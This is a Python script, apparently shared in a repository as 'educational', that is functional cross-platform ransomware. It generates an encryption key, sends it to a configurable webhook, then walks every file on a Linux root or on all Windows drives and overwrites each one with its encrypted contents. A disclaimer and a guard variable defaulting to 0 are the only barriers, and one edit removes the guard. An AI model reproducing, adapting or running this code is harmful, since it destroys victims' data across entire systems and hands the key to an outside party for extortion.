import os
from cryptography.fernet import Fernet
from requests import post
from string import ascii_uppercase

# Author Karbasi

# The code provided in this repository is for educational and informational purposes only.
# I do not take any responsibility for any misuse or damage that may result from the use of this code.
# Use it at your own risk.
# If you want to run this script change the 0 to 1
Run_it_at_your_own_RISK = 0
webhook = "Your webhook API"  # change this to your webhook API


def key_sender(data):
    # how many tries for sending the key just in case
    for tries in range(5):
        try:
            post(webhook, data)
            print("[+] Successful sent the key to webhook")
            break
        except Exception as e:
            print("[-] Failed to send the key, ERROR: ", e)

def filereader(file: str):
    with open(file, "rb") as f:
        data = f.read()
    print(f"[+] Reading {file}")
    filewriter(file, tool.encrypt(data))


def filewriter(file: str, data: bytes):
    with open(file, 'wb') as f:
        f.write(data)
        print(f"[+] Encrypted {file}")

def linux_walker():
    file = None
    os.chdir("/")
    for path, directories, files in os.walk("/"):
        try:
            for file in files:
                filepath = os.path.join(path, file)
                if filepath == __file__:
                    continue
                else:
                    filereader(filepath)
        except PermissionError:
            print(f"[-] Permission Error: Unable to read/encrypt {file}")
        except FileNotFoundError:
            print(f"[-] File Not Found: {file}")
        except Exception as e:
            print(f"[-] Failed to encrypt {file}: {e}")


def windows_walker():
    file = None
    drives = []
    for letter in ascii_uppercase:
        if os.path.exists(f"{letter}:"):
            drives.append(letter)
    for drive in drives:
        os.chdir(f"{drive}:\\")
        for path, directories, files in os.walk(f"{drive}:\\"):
            try:
                for file in files:
                    filepath = os.path.join(path, file)
                    if filepath == __file__:
                        continue
                    else:
                        filereader(filepath)
            except PermissionError:
                print(f"[-] Permission Error: Unable to read/encrypt {file}")
            except FileNotFoundError:
                print(f"[-] File Not Found: {file}")
            except Exception as e:
                print(f"[-] Failed to encrypt {file}: {e}")


if Run_it_at_your_own_RISK != 0:
    key = Fernet.generate_key()
    key_sender(key)
    tool = Fernet(key)
    # support for cross-platform
    if os.name == "posix":
        linux_walker()
    elif os.name == "nt":
        windows_walker()
    else:
        print("[!] System is not supported.")
